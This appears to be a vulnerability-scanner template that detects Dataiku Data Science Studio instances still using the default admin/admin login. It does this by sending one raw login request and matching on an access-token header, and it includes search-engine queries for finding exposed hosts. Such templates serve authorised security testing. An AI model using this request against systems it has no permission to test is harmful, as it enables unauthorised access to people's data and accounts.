id: dataiku-default-login

info:
  name: Dataiku Default Credentials
  author: random-robbie
  severity: high
  description: Dataiku default login credentials were discovered.
  reference:
    - https://www.dataiku.com
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:L
    cvss-score: 8.3
    cwe-id: CWE-522
    cpe: cpe:2.3:a:dataiku:data_science_studio:*:*:*:*:*:*:*:*
  metadata:
    verified: true
    max-request: 1
    vendor: dataiku
    product: data_science_studio
    shodan-query: http.title:"dataiku"
    fofa-query: title="dataiku"
    google-query: intitle:"dataiku"
    runzero-match: any(each(service["html.titles"]), {# matches "(?i)dataiku"})
  tags: default-login,dataiku

http:
  - raw:
      - |
        POST /dip/api/login HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded;charset=utf-8

        login=admin&password=admin

    matchers-condition: and
    matchers:
      - type: word
        part: header
        words:
          - dss_access_token

      - type: status
        status:
          - 200

